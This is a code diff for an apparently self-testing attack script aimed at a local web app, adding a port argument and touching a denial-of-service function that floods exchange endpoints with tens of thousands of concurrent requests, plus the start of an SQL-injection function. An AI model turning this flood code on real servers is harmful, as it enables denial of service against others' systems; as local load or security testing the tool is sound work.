@@ -52,9 +52,9 @@ class AsyncHttpClient:
     async def login(self, username, password):
         self.session = aiohttp.ClientSession()
         try:
-            login_url = 'http://localhost:5000/login'
+            port = args.port
+            login_url = f"http://localhost:{port}/login"
             login_data = {'username': username, 'password': password}
-            print(login_data)
             response = await self.session.post(login_url, data=login_data)
             if response.status == 200:
                 print("Login successful")
@@ -106,8 +106,9 @@ class AsyncHttpClient:
 
 class SyncHttpClient:
     def __init__(self, username, password):
+        port = args.port
         self.session = requests.Session()
-        self.login_url = "http://127.0.0.1:5000/login"
+        self.login_url = f"http://127.0.0.1:{port}/login"
         self.username = username
         self.password = password
         self.login()
@@ -137,6 +138,8 @@ parser = argparse.ArgumentParser()
 parser.add_argument('-a', dest='attack', required=True, choices=attack_choices,
                     help='Supported Attacks. Use "list" to see all options.', metavar='')
 
+parser.add_argument('-i', dest="port", type=str, help='port of the webserver app', required=True)
+
 parser.add_argument('-u', dest="username")
 parser.add_argument('-p', dest='password',
                     action=PasswordPromptAction, type=str, required=True)
@@ -144,14 +147,15 @@ parser.add_argument('-p', dest='password',
 args = parser.parse_args()
 
 async def dos_attack(username, password):
-    base_url = "http://localhost:5000"  # Replace with your server URL
+    port = args.port
+    base_url = "http://localhost:" + args.port  # Replace with your server URL
 
     client = AsyncHttpClient()
 
     await client.login(username, password)
 
     endpoint = "exchange/US"
-    await client.get("http://localhost:5000/exchange/US")
+    await client.get(f"http://localhost:{port}/exchange/US")
 
     # Record the start time
     start_time = time.time()
@@ -162,8 +166,10 @@ async def dos_attack(username, password):
         elapsed_time = current_time - start_time
 
         # Send 10 concurrent GET requests
-        urls = ['http://localhost:5000/exchange/US', 'http://localhost:5000/exchange/TO',
-                'http://localhost:5000/exchange/LSE', 'http://localhost:5000/exchange/V'] * 10000
+        urls = [f'http://localhost:{port}/exchange/US',
+        f'http://localhost:{port}/exchange/TO',
+        f'http://localhost:{port}/exchange/LSE',
+        f'http://localhost:{port}/exchange/V'] * 10000
         tasks = [client.get(url) for url in urls]
         await asyncio.gather(*tasks)
 
@@ -176,7 +182,7 @@ async def dos_attack(username, password):
     await client.close_session()
 
 async def sql_injection_attack():
-    base_url = "http://localhost:5000"  # Replace with your server URL
+    base_url = "http://localhost:" + args.port  # Replace with your server URL
 
     client = AsyncHttpClient()
 
